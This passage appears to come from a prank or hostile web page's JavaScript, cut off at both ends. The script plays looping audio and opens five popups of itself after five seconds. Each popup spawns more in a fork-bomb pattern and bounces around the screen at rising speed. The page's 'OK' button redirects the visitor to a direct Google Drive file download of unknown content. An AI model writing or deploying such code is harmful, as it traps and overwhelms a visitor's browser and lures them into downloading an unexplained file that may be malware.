    <audio id="bgAudio" src="https://www.image2url.com/r2/default/audio/1776267754728-6e47a7fa-9b86-4ad8-9f6f-365aabd9dc88.mp3" loop></audio>

    <script>
        const okBtn = document.getElementById('okBtn');
        const bgAudio = document.getElementById('bgAudio');
        const currentUrl = window.location.href;
        const windowFeatures = "width=500,height=500,menubar=no,toolbar=no,location=no,status=no";

        if (!window.opener) {
            localStorage.setItem('bounceSpeed', '1');
        }

        window.addEventListener('beforeunload', () => {
            let speed = parseFloat(localStorage.getItem('bounceSpeed') || 1);
            localStorage.setItem('bounceSpeed', (speed + 0.5).toString());
        });

        if (window.opener) {
            let x = Math.random() * (screen.availWidth - 500);
            let y = Math.random() * (screen.availHeight - 500);
            let dx = (Math.random() * 10) + 2;
            let dy = (Math.random() * 10) + 2;
            
            setInterval(() => {
                let speedMult = parseFloat(localStorage.getItem('bounceSpeed') || 1);
                x += dx * speedMult;
                y += dy * speedMult;
                
                if (x <= 0 || x >= screen.availWidth - 500) {
                    dx = -dx;
                }
                if (y <= 0 || y >= screen.availHeight - 500) {
                    dy = -dy;
                }
                
                window.moveTo(x, y);
            }, 10);
            
            bgAudio.play().catch(e => console.log("Audio autoplay blocked by browser until user interaction."));
        }

        setTimeout(() => {
            for (let i = 0; i < 5; i++) {
                window.open(currentUrl, '_blank', windowFeatures);
            }
        }, 5000);

        okBtn.addEventListener('click', () => {
            bgAudio.play();
            window.location.href = 'https://drive.usercontent.google.com/download?id=13VeccIwxVJgNIiBdY57oQD88Ci9iC3N7&export=download&authuser=0';
